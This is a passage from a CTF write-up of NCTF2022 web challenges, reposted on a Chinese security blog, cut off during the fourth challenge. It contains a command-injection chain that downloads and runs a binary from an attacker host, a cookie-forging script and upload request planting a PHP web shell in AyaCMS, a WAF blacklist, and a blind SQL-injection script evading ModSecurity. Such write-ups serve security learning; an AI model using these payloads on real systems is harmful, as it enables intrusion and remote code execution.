---
title: NCTF2022  Web Writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/16965754.html
source: 博客园 - 渗透测试中心
date: 2022-12-09
fetch_date: 2025-10-04T01:00:29.294792
---

# NCTF2022  Web Writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [NCTF2022 Web Writeup](https://www.cnblogs.com/backlion/p/16965754.html "发布于 2022-12-08 12:15")

## 1.calc

题目地址：http://116.205.139.166:8001/

右键 /source 源码

```
@app.route("/calc",methods=['GET'])
def calc():
    ip = request.remote_addr
    num = request.values.get("num")
    log = "echo {0}{1}{2}> ./tmp/log.txt".format(time.strftime("%Y%m%d-%H%M%S",time.localtime()),ip,num)
    if waf(num):
        try:
            data = eval(num)
            os.system(log)
        except:
            pass
        return str(data)
    else:
        return "waf!!"
```

flask 报错可以看到 waf 的过滤规则

`http://162.14.110.241:8050/calc?num[]=`

```
def waf(s):
    blacklist = ['import','(',')','#','@','^','$',',','>','?','`',' ','_','|',';','"','{','}','&','getattr','os','system','class','subclasses','mro','request','args','eval','if','subprocess','file','open','popen','builtins','compile','execfile','from_pyfile','config','local','self','item','getitem','getattribute','func_globals','__init__','join','__dict__']
    flag = True
    for no in blacklist:
        if no.lower() in s.lower():
            flag= False
            print(no)
            break
    return flag
```

试了一圈发现可以对 num 操作一下, 用 `%0a` 分隔不同命令, `%09` 代替空格

然后注意需要使语句正常执行 `eval(num)`, 不然就不会跳到 `os.system(log)` 这句, 解决方法是用单引号把命令包起来

```
/calc?num=%0a'curl'%09'gtwq54.dnslog.cn'%0a
```

因为过滤了反引号不好外带回显, 索性直接用 curl 下载 payload 配合 msf 上线

```
/calc?num=%0a'curl'%09'http://x.x.x.x:yyyy/testapp'%09'-o'%09'/tmp/testapp'%0a
/calc?num=%0a'chmod'%09'777'%09'/tmp/testapp'%0a
/calc?num=%0a'/tmp/testapp'%0a
```

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031408772.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221208121448937-1445599656.png "image-20221203140818575")

## 2.ez\_php

题目地址：http://81.70.155.160/

ayacms github 地址

<https://github.com/loadream/AyaCMS>

issues 里能看到很多漏洞, 但是全都要登录后台/前台

后台 admin.php 试了弱口令无果, 前台也无法注册…

于是直接下载源码进行代码审计, 然后看了大半天

源码很多地方开头都有 `defined('IN_AYA') or exit('Access Denied');`, 即不能直接访问, 必须要通过其它已经定义 `IN_AYA` 常量的 php 文件来 include 或 require 才行

这样思路就转换为寻找存在文件包含的漏洞点

找了好久在 /aya/admin.inc.php 找到一处

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031946153.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221208121450077-923374222.png "image-20221203194607945")

其中的 `get_cookie` 获取带有 `aya_` 前缀的 cookie 值, decrypt 也能找到对应 encrypt 函数的源码

加密过程中的 `AYA_KEY` 就是默认值 `aaa`

有了文件包含之后思路就广了许多, 然后结合一下已知漏洞

<https://github.com/loadream/AyaCMS/issues/3>

payload

```
<?php
function random($length=4,$chars='abcdefghijklmnopqrstuvwxyz'){
    $hash='';
    $max=strlen($chars)-1;
    for($i=0;$i<$length;$i++){
        $hash.=$chars[mt_rand(0,$max)];
    }
    return $hash;
}
function kecrypt($txt,$key){
    $key=md5($key);
    $len=strlen($txt);
    $ctr=0;
    $str='';
    for($i=0;$i<$len;$i++){
        $ctr=$ctr==32?0:$ctr;
        $str.=$txt[$i]^$key[$ctr++];
    }
    return $str;
}
function encrypt($txt,$key=''){
    $key or $key='aaa';
    $rnd=random(32);
    $len=strlen($txt);
    $ctr=0;
    $str='';
    for($i=0;$i<$len;$i++){
        $ctr=$ctr==32?0:$ctr;
        $str.=$rnd[$ctr].($txt[$i]^$rnd[$ctr++]);
    }
    return str_replace('=','',base64_encode(kecrypt($str,$key)));
}
echo encrypt('../module/admin/fst_upload');
```

http 包

```
POST /aya/admin.inc.php HTTP/1.1
Host: 81.70.155.160
Content-Length: 244
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykhsd4wQ8UBmzCnD1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.62
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: aya_admin_lang=QWwPIAJ9EitZZEEoQWtYOFA0DCUAMFttV2ANPBUlRmFNKBRmFTEQG1ZxTDFaaVEyQyMWdA
Connection: close
------WebKitFormBoundarykhsd4wQ8UBmzCnD1
Content-Disposition: form-data; name="upfile"; filename="xzxz123123123.php"
Content-Type: application/octet-stream
<?php eval($_REQUEST[1]);phpinfo();?>
------WebKitFormBoundarykhsd4wQ8UBmzCnD1
```

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031953539.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221208121451194-355254652.png "https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031953539.png")

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212031954835.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221208121453088-1837261117.png "image-20221203195402783")

## 3.ezbypass

hint 提示 waf 是 modsecurity

题目地址：http://162.14.110.241:8099/sql.php   http://121.37.11.207:8099/sql.php

网上找到一篇参考文章

<https://blog.h3xstream.com/2021/10/bypassing-modsecurity-waf.html>

剩下就是照着它的 payload 用脚本直接梭, 因为题目提示 `Can you find my password?`, 所以猜 password 列的内容就行

```
import requests
import time
flag = ''
i = 1
while True:
    min = 32
    max = 127
    while min < max:
        time.sleep(0.08)
        mid = (min + max) // 2
        print(chr(mid))
        payload = 'if(ascii 1.e(substring(1.e(select password from users.info),{},1))>{},1,0)'.format(i, mid)
        url = 'http://162.14.110.241:8099/sql.php?id={}'.format(payload)
        res = requests.get(url)
        if 'letian' in res.text:
            min = mid + 1
        else:
            max = mid
    flag += chr(min)
    i += 1
    print('found', flag)
```

![https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202212032123517.png](https://img2023.cnblogs.com/blog/1049983/202212/1049983-20221208121454533-2039690375.png "image-20221203212353384")

## 4.ez\_sql

题目地址：http://81.70.155.160:3000/     https://nctf.h4ck.fun/static/upload/files/06b43b853452e30514edf6bd709b3f99.zip

题目描述给了源码

app.js

```
import { Application, Router, helpers } from "https://deno.land/x/oak/mod.ts";
import Flight from './db.js';
const app = new Application();
const router = new Router();
router.get('/', async(ctx) => {
    ctx.response.body = 'ch...